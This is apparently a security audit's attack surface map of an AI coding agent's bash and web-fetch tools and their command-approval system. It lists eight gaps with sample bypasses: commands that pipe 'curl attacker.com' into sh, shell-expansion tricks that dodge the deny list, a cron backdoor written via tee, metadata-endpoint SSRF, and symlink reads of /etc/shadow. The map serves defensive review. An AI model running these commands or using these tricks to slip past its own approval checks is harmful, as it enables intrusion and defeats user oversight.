# Attack Surface Map: Team-02 (Agent Tool Execution + Approval System)
# Components: DFD-3 (LLM Output -> Agent Tool -> bash -c), CFD-2 (Agent Approval)

## Entry Points

- `x/tools/bash.go:53` — `BashTool.Execute` — accepts `map[string]any` with `"command"` string key; passes directly to `bash -c <command>`
- `x/tools/webfetch.go:74` — `WebFetchTool.Execute` — accepts `map[string]any` with `"url"` string key; calls `url.Parse` (accepts all schemes) then sends to ollama.com API
- `x/tools/websearch.go:80` — `WebSearchTool.Execute` — accepts `map[string]any` with `"query"` string key; forwarded verbatim to ollama.com search API
- `x/cmd/run.go:369` — `Chat` agent loop, `pendingToolCalls` iterator — LLM-generated tool calls arrive here; toolName and args extracted from JSON, dispatched to tool registry
- `x/agent/approval.go:153` — `IsAutoAllowed` — bash command string checked against hardcoded prefix/exact lists; result bypasses prompt
- `x/agent/approval.go:175` — `IsDenied` — bash command string checked against deny patterns; blocks or allows
- `x/agent/approval.go:389` — `IsAllowed` — checks allowlist/prefix map for previously approved commands
- `x/agent/approval.go:459` — `AddToAllowlist` — adds prefix or exact match to session allowlist

## Trust Boundary Crossings

- LLM output (untrusted) -> `pendingToolCalls` slice (x/cmd/run.go:370) -> tool dispatch (x/cmd/run.go:436): LLM controls toolName and all args; no structural validation before dispatch
- `args["command"]` string (LLM-controlled) -> `bash -c <command>` (x/tools/bash.go:64): Shell metacharacters in command pass directly to bash interpreter; approval system is the only gate
- `extractBashPrefix` return value (x/agent/approval.go:204) -> `a.prefixes` map (x/agent/approval.go:469): The prefix extracted from a previously-approved command is used to auto-approve future commands; if extraction is inaccurate, future commands bypass prompting
- `args["url"]` (LLM-controlled) -> `webFetchRequest{URL: urlStr}` -> `https://ollama.com/api/web_fetch`: Ollama signing key is attached; LLM can cause signed requests to ollama.com for any URL
- Non-bash toolName -> `a.allowlist[toolName]` (x/agent/approval.go:418): Once any call to a non-bash tool is approved for the session, ALL subsequent calls to that tool are auto-approved regardless of arguments

## Auth / AuthZ Decision Points

- `x/cmd/run.go:400` — YoloMode check — if `opts.YoloMode == true`, skip all approval; runs any tool with no user interaction
- `x/cmd/run.go:373-395` — `IsDenied` gate — blocks commands matching deny patterns before approval; bypass here means no prompt shown
- `x/cmd/run.go:404` — `IsAllowed` gate — if returns true, tool executes without prompt; feeds from `extractBashPrefix` matching
- `x/agent/approval.go:389` — `IsAllowed` — decides approve-without-prompt based on allowlist/prefix; see trust chain
- `x/agent/approval.go:175` — `IsDenied` — blocks on string pattern match of full command (lowercase); case-insensitive but substring-based, not tokenized

## Validation / Sanitization Functions

- `x/agent/approval.go:204` — `extractBashPrefix` — extracts a `cmd:dir/` prefix from bash command for allowlisting; uses `strings.Split("|")` for pipe splitting; uses `path.Clean` for normalization; has `..` and absolute-path rejection; does NOT handle `;`, `&&`, `||`, `$()`, backticks, brace expansion
- `x/agent/approval.go:175` — `IsDenied` — substring match on lowercased command against denyPatterns and denyPathPatterns; tokenization-unaware; does not check pipe targets or command substitution results
- `x/agent/approval.go:312` — `isCommandOutsideCwd` — checks if command args reference paths outside cwd; splits on `|`, `;`, `&`; does NOT handle `$()`, backticks, quoted args
- `x/tools/webfetch.go:85` — `url.Parse` — only checks URL parseability; allows `file://`, `javascript:`, `data:` schemes
- `x/agent/approval.go:153` — `IsAutoAllowed` — prefix matches against `autoAllowPrefixes`; NOTE: `IsAutoAllowed` call is commented out in run.go:391-394 (TODO), so currently has no effect

## Layer Trust Chain

| From Layer | To Layer | Trust Assumption | Holds for ALL paths? | Alternate Paths that Skip This Layer? |
|---|---|---|:---:|---|
| LLM response JSON | pendingToolCalls (run.go:370) | LLM output is structurally valid tool call | YES (JSON deserialization) | N/A |
| pendingToolCalls | IsDenied check (run.go:373) | Command string contains the dangerous pattern verbatim and unobfuscated | NO | Command substitution `$()`, env var expansion `$VAR`, brace expansion `{a,b}`, encoding tricks bypass substring match |
| IsDenied check | IsAllowed / approval prompt (run.go:404) | Command not in deny list | YES (sequential) | YoloMode (run.go:400) skips entire block |
| IsAllowed (prefix match) | Tool execution (run.go:436) | Stored prefix accurately scopes future allowed commands | NO | Pipe target bypass (`cmd tools/f | tee /etc/cron.d/x`); shell metacharacter injection in arg (`cat tools/$(cmd)`); `sed -i` escalation from read-only seed; `find -exec` escalation |
| extractBashPrefix | a.prefixes map | Pipe split on `\|` captures all execution paths in command | NO | `cmd1 ; cmd2`, `cmd1 && cmd2`, `cmd1 || cmd2`, `cmd $(subshell)` all bypass pipe-only splitting |
| Tool dispatch | BashTool.Execute | Approved command equals the command that will run | NO | Prefix match means a DIFFERENT (more dangerous) command executes under the same approved prefix |
| Non-bash tool approval | Tool execution | Tool-name approval scopes to specific safe arguments | NO | First approval of `web_fetch` blanket-approves ALL future `web_fetch` calls (any URL) |
| Approval prompt (UI) | AddToAllowlist | User sees the dangerous command as displayed | PARTIAL | `isCommandOutsideCwd` warning is not shown for all dangerous patterns (e.g., pipe targets to /etc) |

## Trust Chain Gaps (rows where "Alternate Paths" column is NOT empty)

### GAP-1: IsDenied Bypass via Shell Expansion
`IsDenied` is a substring match on the literal command string. Bash expands variables, command substitutions, and brace expressions AFTER the check. An LLM can craft `cat tools/$(echo /etc/passwd | base64 -d)` — `IsDenied` sees `cat tools/...` (no deny pattern match), but bash executes the inner subshell. Similarly `rm${IFS}-rf${IFS}/tmp/x` defeats the `rm -rf` deny pattern.

### GAP-2: Pipe Target Not Scoped by Prefix Extraction
`extractBashPrefix` splits on `|` and only examines `parts[0]`. The remainder of the pipeline (`| tee /etc/cron.d/backdoor`, `| bash`, `| sh`) is completely ignored. Once `cat:tools/` is in the allowlist, `cat tools/safe.go | tee /etc/cron.d/backdoor` is auto-approved.

### GAP-3: Semicolon / AND / OR Operators Not Split by extractBashPrefix or IsDenied
Both `IsDenied` (substring match on full command) and `extractBashPrefix` (splits only on `|`) fail to decompose commands joined by `;`, `&&`, `||`. `cat tools/a.go; curl attacker.com|sh` passes IsDenied (no deny match for `curl` alone) and is evaluated only as `cat:tools/` prefix for allowlist.

### GAP-4: safeCommands `sed -i` and `find -exec` File Write/Exec Escalation
`sed` and `find` are in `safeCommands`. A first approved command `sed 's/x/y/' tools/a.go` creates prefix `sed:tools/`. Subsequent `sed -i 's/exit 0/curl attacker.com|sh/' tools/deploy.sh` is auto-approved. `find tools/ -name "*.go" -exec rm {} \;` is auto-approved after any `find tools/` is in allowlist.

### GAP-5: Non-bash Tool Blanket Approval
Once `web_fetch` (or `web_search`) is approved once for the session, `a.allowlist["web_fetch"] = true` (run.go:477 pattern, approval.go:477). ALL subsequent `web_fetch` calls with ANY URL are auto-approved. LLM can pivot from fetching a benign URL to fetching `http://169.254.169.254/latest/meta-data` (cloud SSRF) or an internal service.

### GAP-6: Symlink Not Resolved by path.Clean
`path.Clean` is lexical. A symlink `tools/link -> /etc/shadow` is not detected. After approving `cat:tools/`, `cat tools/link` is auto-approved and reads `/etc/shadow`.

### GAP-7: YoloMode Global Bypass
`opts.YoloMode == true` skips the entire approval block at run.go:400. Neither `IsDenied` nor any allowlist check applies. Any LLM-directed command executes unconditionally.

### GAP-8: url.Parse Does Not Reject Non-HTTP Schemes in web_fetch
`url.Parse` in webfetch.go:85 accepts `file://`, `data:`, `javascript:` schemes without error. A `file:///etc/passwd` URL would pass validation. Whether ollama.com's API proxies such URLs is unclear, but the local validation is absent.
